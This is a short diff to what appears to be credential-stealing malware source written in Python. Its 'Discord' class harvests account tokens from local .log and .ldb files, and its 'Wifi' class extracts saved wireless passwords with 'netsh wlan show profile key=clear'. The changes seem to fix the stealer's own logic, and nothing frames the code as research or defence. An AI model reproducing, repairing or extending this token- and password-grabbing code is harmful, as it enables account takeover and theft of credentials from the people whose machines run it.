@@ -351,7 +351,7 @@ class Discord:
                                     if uid not in self.ids:
                                         self.tokens.append(token)
                                         self.ids.append(uid)
-
+            else:
                 for file_name in os.listdir(path):
                     if file_name[-3:] not in ["log", "ldb"]:
                         continue
@@ -731,7 +731,6 @@ class Wifi:
                     f.write(f'There is no wireless interface on the system. Ethernet using twat.')
                 f.close()
 
-        self.name_pass[i] = ""
         for i in self.wifi_list:
             command = subprocess.getoutput(
                 f'netsh wlan show profile "{i}" key=clear')
